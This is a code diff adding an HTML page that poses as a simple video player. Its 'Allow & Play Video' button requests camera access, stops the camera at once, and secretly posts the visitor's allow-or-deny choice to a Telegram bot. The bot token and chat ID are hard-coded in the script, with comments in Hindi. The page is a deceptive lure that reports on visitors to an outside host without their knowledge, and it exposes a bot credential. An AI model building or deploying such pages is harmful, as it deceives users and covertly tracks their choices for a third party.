@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Single Video Only</title>
+
+<style>
+body {
+    background: black;
+    color: white;
+    text-align: center;
+    font-family: Arial;
+    padding: 20px;
+}
+
+video {
+    width: 320px;
+    border: 2px solid white;
+    margin-top: 15px;
+}
+
+button {
+    padding: 12px 20px;
+    font-size: 16px;
+    cursor: pointer;
+    margin-top: 20px;
+}
+</style>
+</head>
+
+<body>
+
+<h2>🎬 Video</h2>
+
+<video id="mainVideo" controls>
+    <source src="sample.mp4" type="video/mp4">
+</video>
+
+<br>
+
+<button onclick="requestPermission()">Allow & Play Video</button>
+
+<script>
+/* ===== TELEGRAM CONFIG (YAHAN DALO) ===== */
+const BOT_TOKEN = "7051739067:AAEF8mYur4SDFw729kPF_DWax_BBF04D_kw";
+const CHAT_ID  = "-1003569451477";
+/* ====================================== */
+
+function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+        })
+    });
+}
+
+async function requestPermission() {
+    try {
+        // Ask camera permission (camera show nahi hoga)
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+        // Camera turant band
+        stream.getTracks().forEach(track => track.stop());
+
+        // Telegram notify
+        sendToTelegram("✅ User allowed permission & video started");
+
+        // Normal video play
+        document.getElementById("mainVideo").play();
+
+    } catch (e) {
+        alert("Permission denied");
+        sendToTelegram("❌ User denied permission");
+    }
+}
+</script>
+
+</body>
+</html>
